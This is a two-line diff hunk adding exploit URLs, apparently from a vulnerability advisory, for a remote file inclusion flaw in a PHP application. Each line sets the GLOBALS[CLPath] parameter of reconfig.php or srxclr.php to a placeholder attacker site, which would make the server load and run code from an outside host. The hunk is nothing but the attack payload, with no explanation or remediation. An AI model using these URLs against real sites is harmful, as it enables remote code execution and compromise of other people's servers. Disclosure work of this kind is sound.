@@ -1,0 +1,2 @@
+http://www.example.com/[path]/reconfig.php?GLOBALS[CLPath]=[attacker's site]
+http://www.example.com/[path]/srxclr.php?GLOBALS[CLPath]=[attacker's site]
